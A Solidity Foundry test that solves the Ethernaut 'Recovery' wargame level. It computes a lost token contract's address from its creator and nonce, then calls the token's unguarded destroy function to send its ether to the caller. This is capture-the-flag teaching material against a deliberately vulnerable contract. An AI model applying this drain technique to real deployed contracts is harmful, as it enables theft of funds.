pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Recovery/RecoveryFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testRecovery() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
        Recovery ethernautRecovery = Recovery(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed#:~:text=The%20address%20for%20an%20Ethereum,then%20hashed%20with%20Keccak%2D256.
        address simpleTokenAddress  = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), ethernautRecovery, bytes1(0x01))))));

        ISimpleToken(simpleTokenAddress).destroy(payable(msg.sender));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
